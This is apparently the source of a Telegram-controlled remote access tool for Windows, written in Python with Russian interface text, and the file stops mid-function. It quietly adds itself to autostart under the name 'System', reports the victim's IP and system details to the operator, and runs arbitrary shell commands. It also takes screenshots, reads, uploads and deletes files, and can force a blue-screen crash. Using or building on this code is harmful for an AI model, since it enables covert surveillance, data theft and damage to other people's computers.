import telebot
import os
import datetime
import webbrowser
import shutil
import pyautogui
import subprocess
import http.client
import ctypes
import ctypes.wintypes
import configparser
import winreg
import keyboard
import pygetwindow
import screen_brightness_control as sbc
import platform
import time
import psutil

from winreg import *
from telebot import types

config = configparser.ConfigParser()
config.read("settings.ini")

#Настройки бота
chat_id = int(config["Main"]["first_id"])  #1 Доступ
chat_idd = int(config["Main"]["second_id"]) #2 Доступ
bot = telebot.TeleBot(config["Main"]["token"], parse_mode=None) #Токен
samp_route = config["SAMP"]["gtasa_route"]
raklite_route = config["SAMP"]["raklite_route"]

#Троллинг
pyautogui.FAILSAFE = False

#///////////////////////////////////////////////
conn = http.client.HTTPConnection("ifconfig.me")
conn.request("GET", "/ip")

#Для функций
error = 0

total_mem, used_mem, free_mem = shutil.disk_usage('.')
gb = 10 ** 9
login = os.getlogin()
width, height = pyautogui.size()
ip = conn.getresponse().read()
oper = platform.uname()



def set_autostart_registry(app_name, key_data = None, autostart: bool = True):
    with winreg.OpenKey(
        key=winreg.HKEY_CURRENT_USER,
        sub_key=r'Software\Microsoft\Windows\CurrentVersion\Run',
        reserved=0,
        access=winreg.KEY_ALL_ACCESS) as key:
        try:
            if autostart:
                winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, key_data)
            
            else:
                winreg.DeleteValue(key, app_name)
        
        except OSError:
            return False
        
        return True

set_autostart_registry(app_name='System', key_data=os.path.abspath(__file__))

zapusk = datetime.datetime.now()
bot.send_message(chat_id, f'🧐 Бот был где-то запущен! \n\n⏰ Точное время запуска: *{zapusk}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n🔑 IP адрес запустившего - *' + str(ip)[2:-1] + f'*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb), parse_mode="Markdown")
print(str(zapusk) + "|" + " Управление компом v. 1.0 успешно запущено!")
        


@bot.message_handler(commands=['start'])
def start(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        return mainmenu(message)


def samp_connect(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if  message.text.strip() == '/start':
            return start()

        elif  message.text.strip() == 'Назад':
            return samp_menu(message)

        try:
            bot.send_message(message.chat.id, f'☑️ Подключаемся к серверу с IP *{ message.text.strip()}*...', parse_mode = "Markdown")
            samp_menu(message)
            return subprocess.Popen(f'{samp_route}\samp.exe {message.text.strip()}', shell=True)
        
        except:
            bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
            return samp_menu(message)



def raklite_connect(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                return start(message)

            if message.text.strip() == 'Назад':
                return samp_menu(message)

            info = message.text.strip().split(',') # ник,ip,port

            if len(info) != 3:
                bot.send_message(message.chat.id, '*❌ Вы не дописали все аргументы! Проверьте ваше сообщение и повторите попытку позже*', parse_mode = "Markdown")
                return samp_menu(message)

            bot.send_message(message.chat.id, f'☑️ Подключаемся к *{info[1]}:{info[2]}*', parse_mode = "Markdown")
            samp_menu(message)
            return subprocess.Popen(f'"{raklite_route}\RakSAMP Lite.exe" -n {info[0]} -h {info[1]} -p {info[2]} -z', shell=True)

        except:
            bot.send_message(message.chat.id, '❌ Произошла ошибка!! Проверьте ваш settings.ini', parse_mode = "Markdown")
            return samp_menu(message)



def powershell_cmd(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):

        if message.text.strip() == 'Назад':
            return console_menu(message)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            try:
                output=subprocess.getoutput(message.text.strip(), encoding='cp866')

                if len(output) > 3999:
                    if os.path.exists('C:\\temp\\') == False:
                        fileName = r'C:\temp'
                        os.mkdir(fileName)
                        kernel32 = ctypes.windll.kernel32
                        attr = kernel32.GetFileAttributesW(fileName)
                        kernel32.SetFileAttributesW(fileName, attr | 2)

                    bot.send_message(message.chat.id, f'☑️ Команда *{message.text.strip()}* успешно выполнена\n\nОтвет от консоли оказался *слишком длинным* и был *сохранен в файл ниже*!', parse_mode = "Markdown")
                    my_file = open("C:\\temp\\ConsoleOutput.txt", "w", encoding="utf-8")
                    my_file.write(output)
                    my_file.close()
                    bot.send_document(message.chat.id, document = open('C:\\temp\\ConsoleOutput.txt', 'rb'))
                    os.remove('C:\\temp\\ConsoleOutput.txt')
                    return bot.register_next_step_handler(message, powershell_cmd)

                bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")
                bot.send_message(message.chat.id, f'☑️ Команда *{message.text.strip()}* успешно выполнена\n\nОтвет от консоли выше', parse_mode = "Markdown")
                return bot.register_next_step_handler(message, powershell_cmd)

            except:
                bot.send_message(message.chat.id, f'☑️ Команда *{message.text.strip()}* успешно выполнена\n\nОтвет от консоли оказался *пустой строкой*!', parse_mode = "Markdown")
                return bot.register_next_step_handler(message, powershell_cmd)



def python_scripts(message):
    if message.text.strip() == '/start':
        return start(message)

    elif message.text.strip() == 'Назад':
        return console_menu(message)
    
    bot.send_message(message.chat.id, f'☑️ *Python скрипт по пути "{message.text.strip()}" был запущен!*', parse_mode = "Markdown")
    console_menu(message)

    try:
        output=subprocess.getoutput(f'python {message.text.strip()}', encoding='cp866')

        bot.send_message(message.chat.id, f'☑️ *Python скрипт по пути "{message.text.strip()}" был успешно выполнен!\nЛог ниже*', parse_mode = "Markdown")
        return bot.send_message(message.chat.id, f'*{output}*', parse_mode = "Markdown")

    except:
        return bot.send_message(message.chat.id, f'❌ *Python скрипт по пути {message.text.strip()} не был запущен из-за ошибки!*', parse_mode = "Markdown")



def bsod(message):
    if message.text.strip() == 'Да, конечно':
        bot.send_message(message.chat.id, f'☑️ *Вы успешно вызвали BSOD!*', parse_mode = "Markdown")
        subprocess.call("cd C:\:$i30:$bitmap", shell=True)
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        return ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

    elif message.text.strip() == '/start':
        return start(message)

    elif message.text.strip() == 'Нет, я передумал':
        bot.send_message(message.chat.id, f'☑️ *Вы успешно отменили BSOD!*', parse_mode = "Markdown")
        return other_functions(message)

    else:
        bot.send_message(message.chat.id, '❌ Ошибка: *неизвестный ответ*!', parse_mode="Markdown")
        return other_functions(message)



def sozd_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return files(message)
        
        else:
            try:
                my_file = open(message.text.strip(), "w")
                my_file.close()
                bot.send_message(message.chat.id, '✍️ *Введите содержимое файла!*', parse_mode='Markdown')
                bot.register_next_step_handler(message, sozd_file2, message.text.strip())

            except:
                bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или не хватает места*', parse_mode="Markdown")
                return files(message)

def sozd_file2(message, route):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):        
        if message.text.strip() == '/start':
            return start(message)

        else:
            my_file = open(str(route), "a+", encoding='utf-8')
            my_file.write(message.text.strip())
            my_file.close()
            bot.send_message(message.chat.id, f'☑️ Файл *{route}* успешно создан!', parse_mode="Markdown")
            return files(message)



def change_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Добавить содержимое")
        item1=types.KeyboardButton("Полностью изменить содержимое")
        item2=types.KeyboardButton("Очистить файл")
        item3=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2, item3)

        bot.send_message(message.chat.id, '*✍️ Выберите действие!*', reply_markup=markup, parse_mode="Markdown")
        return bot.register_next_step_handler(message, change_file1)
    
def change_file1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Назад':
            return files(message)

        elif message.text.strip() == "Добавить содержимое":
            return dobvka_file(message)

        elif message.text.strip() == "Очистить файл":
            return ochistka(message)

        elif message.text.strip() == "Полностью изменить содержимое":
            return izmena(message)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор!* Повторите попытку', parse_mode="Markdown")
            return change_file(message)



def izmena(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Назад")
        markup.add(item0)

        bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, izmena_2)

def izmena_2(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return change_file(message)

        else:
            bot.send_message(message.chat.id, '✍️ *Укажите новое содержимое!*', parse_mode="Markdown")
            return bot.register_next_step_handler(message, izmena_3, message.text.strip())

def izmena_3(message, route):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                return start(message)

            elif message.text.strip() == 'Назад':
                return change_file(message)

            else:
                f = open(str(route),'w',encoding = 'utf-8')
                f.write(message.text.strip())
                f.close()
                bot.send_message(message.chat.id, f'☑️ Файл *{route}* был успешно изменен!', parse_mode="Markdown")
                return mainmenu(message)

        except:
            bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файл не существует!*', parse_mode="Markdown")
            return change_file(message)



def ochistka(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Назад")
        markup.add(item0)

        bot.send_message(message.chat.id, '✍️ *Укажите путь до файла(если файл находятся в исполняемой папке, просто напишите название)*', parse_mode="Markdown", reply_markup=markup)
        return bot.register_next_step_handler(message, check_ochistka)

def check_ochistka(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        route = message.text.strip()
        
        if route == '/start':
            return start(message)

        elif route == 'Назад':
            return change_file(message)

        else:
            try:
                f = open(route,'w+',encoding = 'utf-8')
                f.write("")
                f.close
                bot.send_message(message.chat.id, f'☑️ Файл *{route}* был успешно очищен!', parse_mode='Markdown')
                return mainmenu(message)

            except:
                bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файла не существует*', parse_mode='Markdown')
                return change_file(message)



def dobvka_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Назад")
        markup.add(item0)
        bot.send_message(message.chat.id, '✍️ *Введите название файла с расширением или путь до нужного файла*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, dobavka_put)

def dobavka_put(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return change_file(message)

        else:
            bot.send_message(message.chat.id, '✍️ *Укажите, что нужно добавить!*', parse_mode='Markdown')
            return bot.register_next_step_handler(message, dobavka_final, message.text.strip())

def dobavka_final(message, route):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return change_file(message)

        else:
            try:
                sod = message.text.strip()

                my_file = open(str(route), "a+")
                my_file.write(str(sod))
                my_file.close()
                bot.send_message(message.chat.id, f'☑️ Файл *{route}* успешно создан/изменен!', parse_mode='Markdown')
                return files(message)

            except:
                bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файла не существует!*', parse_mode='Markdown')
                return change_file(message)



def delete_file5545(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Удалить файл")
        item1=types.KeyboardButton("Удалить папку")
        item2=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2)

        bot.send_message(message.chat.id, '✍️ *Выберите то, что необходимо*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, check_delete)

def check_delete(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Удалить папку':
            return delete_papka(message)

        elif message.text.strip() == 'Удалить файл':
            return delete_filee(message)

        elif message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return files(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор!*\nПовторите попытку позже', parse_mode='Markdown')
            return delete_file5545(message)



def delete_filee(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Назад")
        markup.add(item0)

        bot.send_message(message.chat.id, '*✍️ Введите путь к файлу, который надо удалить (либо просто название файла с расширением, если он в текущей папке)!*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, delete_filee1)

def delete_filee1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                return start(message)

            elif message.text.strip() == 'Назад':
                return delete_file5545(message)

            else:
                os.remove(message.text.strip())
                bot.send_message(message.chat.id, f'☑️ Файл по пути *{message.text.strip()}* был успешно удален!', parse_mode = "Markdown")
                return delete_file5545(message)

        except:
            bot.send_message(message.chat.id, '❌ Ошибка: *файл не был найден или отсутствует доступ!*\nПовторите попытку позже', parse_mode='Markdown')
            return delete_file5545(message)



def delete_papka(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Назад")
        markup.add(item0)

        bot.send_message(message.chat.id, '*✍️ Введите путь к папке, которую надо удалить!*', parse_mode='Markdown', reply_markup=markup)
        return bot.register_next_step_handler(message, delete_papka1)

def delete_papka1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == '/start':
                return start(message)

            elif message.text.strip() == 'Назад':
                return delete_file5545(message)
            
            else:
                putt = message.text.strip()
                shutil.rmtree(putt)

                bot.send_message(message.chat.id, f'☑️ Папка по пути *{putt}* была удалена!', parse_mode = "Markdown")
                return delete_file5545(message)
        
        except:
            bot.send_message(message.chat.id, '❌ Ошибка: *папка не была найдена или к ней отсутствует доступ!*\nПовторите попытку', parse_mode='Markdown')
            return delete_file5545(message)



def download_on_pc1(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Выгрузить фото")
        item1=types.KeyboardButton("Выгрузить другое")
        item2=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2)

        bot.send_message(message.chat.id, '*⚽️ Вы в меню выгрузки файлов!*', reply_markup=markup, parse_mode="Markdown")
        bot.register_next_step_handler(message, check_download_on_pc)

def check_download_on_pc(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Выгрузить фото':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '*✍️ Введите путь, куда нужно сохранить выгруженное фото\n(Пример: C:\\pon.jpg)*', parse_mode="Markdown", reply_markup=markup)
            return bot.register_next_step_handler(message, download_photo)

        elif message.text.strip() == 'Выгрузить другое':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '*✍️ Введите путь, куда нужно сохранить выгруженный файл\n(Пример: C:\\pon.txt)*', parse_mode="Markdown", reply_markup=markup)
            return bot.register_next_step_handler(message, download_file_on_pc)

        elif message.text.strip() == 'Назад':
            return files(message)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор!*\nПовторите попытку позже', parse_mode='Markdown')
            return download_on_pc1(message)





def download_file_on_pc(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return download_file_on_pc1(message)

        bot.send_message(message.chat.id, '*✍️ Пришлите файл, который необходимо выгрузить (до 20 мб)*', parse_mode="Markdown")
        return bot.register_next_step_handler(message, download_file_on_pc1, message.text.strip())

def download_file_on_pc1(message, route):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try:
            with open(route, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.send_message(message.chat.id, '*☑️ Успешно сохранено!*', parse_mode="Markdown")
            return download_on_pc1(message)

        except:
            bot.send_message(message.chat.id, '*❌ Отказано в доступе, или файл слишком тяжелый, или указаного пути не существует!*', parse_mode="Markdown")
            return download_on_pc1(message)





def download_photo(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return download_file_on_pc1(message)

        bot.send_message(message.chat.id, '*✍️ Пришлите файл, который необходимо выгрузить (до 20 мб)*', parse_mode="Markdown")
        return bot.register_next_step_handler(message, download_photo1, message.text.strip())

def download_photo1(message, route):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        file_info = bot.get_file(message.photo[len(message.photo) - 1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        try:
            with open(route, 'wb') as new_file:
                new_file.write(downloaded_file)

            bot.send_message(message.chat.id, '*☑️ Успешно сохранено!*', parse_mode="Markdown")
            return download_on_pc1(message)

        except:
            bot.send_message(message.chat.id, '*❌ Отказано в доступе, или файл слишком тяжелый, или указаного пути не существует!*', parse_mode="Markdown")
            return download_on_pc1(message)



def files(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Создание файлов/папок")
        item1=types.KeyboardButton("Удаление файлов/папок")
        item2=types.KeyboardButton("Изменение файлов")
        item3=types.KeyboardButton("Запустить файл/программу")
        item4=types.KeyboardButton("Скачать файл с ПК")
        item5=types.KeyboardButton("Выгрузить файл на ПК")
        item6=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2, item3, item4, item5, item6)
        bot.send_message(message.chat.id, '*🗂 Вы в меню файлов!*', reply_markup=markup, parse_mode="Markdown")
        return bot.register_next_step_handler(message, check_files)

def check_files(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):  
        if message.text.strip() == 'Создание файлов/папок':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Создать файл")
            item1=types.KeyboardButton("Создать папку")
            item2=types.KeyboardButton("Назад")
            markup.add(item0, item1, item2)

            bot.send_message(message.chat.id, '*✍️ Выберите то, что необходимо создать или вернитесь назад!*', reply_markup=markup, parse_mode="Markdown")
            return bot.register_next_step_handler(message, check_create)

        elif message.text.strip() == 'Изменение файлов': 
            return change_file(message)

        elif message.text.strip() == 'Назад':
            return mainmenu(message)

        elif message.text.strip() == 'Удаление файлов/папок':
            return delete_file5545(message)

        elif message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Запустить файл/программу':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла(Пример: test.txt), если файл не из этой папки, введите полный путь!*', reply_markup=markup, parse_mode="Markdown")
            return bot.register_next_step_handler(message, open_file)

        elif message.text.strip() == 'Скачать файл с ПК':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла(Пример: test.txt), если файл не из этой папки, введите полный путь (до 50 мб)*', reply_markup=markup, parse_mode="Markdown")
            return bot.register_next_step_handler(message, download_file)

        elif message.text.strip() == 'Выгрузить файл на ПК':
            return download_on_pc1(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор!\nПовторите попытку*', parse_mode='Markdown')
            return files(message)


def check_create(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Создать файл':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '*✍️ Введите название и расширение файла(Пример: test.txt)!*', parse_mode="Markdown", reply_markup=markup)
            return bot.register_next_step_handler(message, sozd_file)

        elif message.text.strip() == 'Создать папку':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '*✍️ Введите путь к новой папке или просто введите ее название, если хотите ее создать в месте, где запущен скрипт\n\n❗️ Пример пути: C:\\Новая папка*', parse_mode="Markdown", reply_markup=markup)
            return bot.register_next_step_handler(message, create_folder)

        elif message.text.strip() == 'Назад':
            return files(message)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор!\nПовторите попытку*', parse_mode="Markdown")
            return files(message)

def create_folder(message):
    try:
        route = message.text.strip()

        if route == '/start':
            return start(message)

        elif route == 'Назад':
            return files(message)

        os.mkdir(str(route))

        bot.send_message(message.chat.id, f'*☑️ Папка по пути "{route}" была успешно создана!*', parse_mode="Markdown")
        return files(message)

    except:
        bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или не хватает места*', parse_mode="Markdown")
        return files(message)



def download_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            route = message.text.strip()
            
            if route == '/start':
                return start(message)

            elif str(route) == 'Назад':
                return files(message)

            file = open(str(route), 'rb')
            bot.send_document(message.chat.id, file)
            return files(message)

        except:
            bot.send_message(message.chat.id, '❌ Ошибка: *нет доступа или файл не существует*', parse_mode='Markdown')
            return files(message)


def open_file(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        try:
            if message.text.strip() == "/start":
                return start(message)

            elif message.text.strip() == 'Назад':
                return files(message)
            
            else:
                os.startfile(message.text.strip())
                bot.send_message(message.chat.id, f'*☑️ Файл {message.text.strip()} успешно запущен!*', parse_mode="Markdown")
                return files(message)

        except:
            bot.send_message(message.chat.id, '❌ *Файл не найден или отсутствует доступ!* Повторите попытку', parse_mode="Markdown")
            return files(message)



def create_error(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return console_menu(message)

        bot.send_message(message.chat.id, '❗️ *Впишите содержимое ошибки!*', parse_mode='Markdown')
        return bot.register_next_step_handler(message, create_error2, message.text.strip())

def create_error2(message, zagl):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == '/start':
            return start(message)

        elif message.text.strip() == 'Назад':
            return console_menu(message)

        bot.send_message(message.chat.id, '❗️ *Ошибка успешно создана!*', parse_mode='Markdown')
        console_menu(message)
        return ctypes.windll.user32.MessageBoxW(0, message.text.strip(), zagl, 0)



def console_menu(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
        item0=types.KeyboardButton("Ввод команд")
        item1=types.KeyboardButton("Запустить Python скрипт")
        item2=types.KeyboardButton("Сделать скриншот")
        item3=types.KeyboardButton("Открыть сайт")
        item4=types.KeyboardButton("Создать ошибку")
        item5=types.KeyboardButton("Информация о ПК")
        item6=types.KeyboardButton("Список процессов")
        item7=types.KeyboardButton("Назад")
        markup.add(item0, item1, item2, item3, item4, item5, item6, item7)

        bot.send_message(message.chat.id, '💻 *Вы в меню консоли!*', reply_markup=markup, parse_mode='Markdown')
        return bot.register_next_step_handler(message, console_check)

def console_check(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        if message.text.strip() == 'Ввод команд': 
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("tasklist")
            item1=types.KeyboardButton("ping")
            item2=types.KeyboardButton("Назад")
            markup.add(item0, item1, item2)
            bot.send_message(message.chat.id, '🖥 *Введите команду для консоли!\n\n❗️ При любых непонятных ситуациях вводите /start*', reply_markup=markup, parse_mode='Markdown')
            return bot.register_next_step_handler(message, powershell_cmd)

        elif message.text.strip() == 'Список процессов':
            process_list(message)


        elif message.text.strip() == 'Сделать скриншот':
            try:
                if os.path.exists('C:\\temp\\') == False:
                    fileName = r'C:\temp'
                    os.mkdir(fileName)
                    kernel32 = ctypes.windll.kernel32
                    attr = kernel32.GetFileAttributesW(fileName)
                    kernel32.SetFileAttributesW(fileName, attr | 2)

                pyautogui.screenshot('C:\\temp\\screenshot1.png')
                bot.send_document(message.chat.id, open('C:\\temp\\screenshot1.png', 'rb'))
                return console_menu(message)

            except PermissionError:
                bot.send_message(message.chat.id, '❌ *У бота недостаточно прав!*', parse_mode='Markdown')
                return console_menu(message)

        elif message.text.strip() == 'Информация о ПК':
            active_window = pygetwindow.getActiveWindowTitle()
            if active_window == None or active_window == '':
                active_window = 'Рабочий стол'

            bot.send_message(chat_id, f'⏰ Точное время запуска: *{zapusk}*\n💾 Имя пользователя - *{login}*\n🪑 Операционная система - *{oper[0]} {oper[2]} {oper[3]}*\n🧮 Процессор - *{oper[5]}*\n🔑 IP адрес запустившего - *' + str(ip)[2:-1] + f'*\n🖥 Разрешение экрана - *{width}x{height}*\n📀 Память: ' + '*{:6.2f}* ГБ'.format(total_mem/gb) + " всего, осталось *{:6.2f}* ГБ".format(free_mem/gb) + f"\n*🖼 Активное окно - {active_window}*", parse_mode="Markdown")
            return console_menu(message)

        elif message.text.strip() == 'Создать ошибку':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '❗️ *Введите заголовок ошибки!*', parse_mode='Markdown', reply_markup=markup)
            return bot.register_next_step_handler(message, create_error)

        elif message.text.strip() == 'Запустить Python скрипт':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '❗️ *Введите путь скрипта!*', parse_mode='Markdown', reply_markup=markup)
            return bot.register_next_step_handler(message, python_scripts)

        elif message.text.strip() == 'Открыть сайт':
            markup=types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard = True)
            item0=types.KeyboardButton("Назад")
            markup.add(item0)

            bot.send_message(message.chat.id, '✍️ *Введите адрес сайта!*', reply_markup=markup, parse_mode='Markdown')
            return bot.register_next_step_handler(message, open_site)

        elif message.text.strip() == 'Назад':
            return mainmenu(message)

        elif message.text.strip() == '/start':
            return start(message)

        else:
            bot.send_message(message.chat.id, '❌ *Неверный выбор! Повторите попытку*', parse_mode='Markdown')
            return console_menu(message)


def process_list(message):
    get_chat_id = message.chat.id

    if int(get_chat_id) == int(chat_id) or int(get_chat_id) == int(chat_idd):
        processes = 'Список процессов:\n\n'
        for i in psutil.pids():
            try:
                processes+=f'ID: {i}\nНазвание: {psutil.Process(i).name()}\nПуть: P{psutil.Process(i).exe()}\n\n'
                        
            except:
                continue
                
        else:
            if os.path.exists('C:\\temp\\') == False:
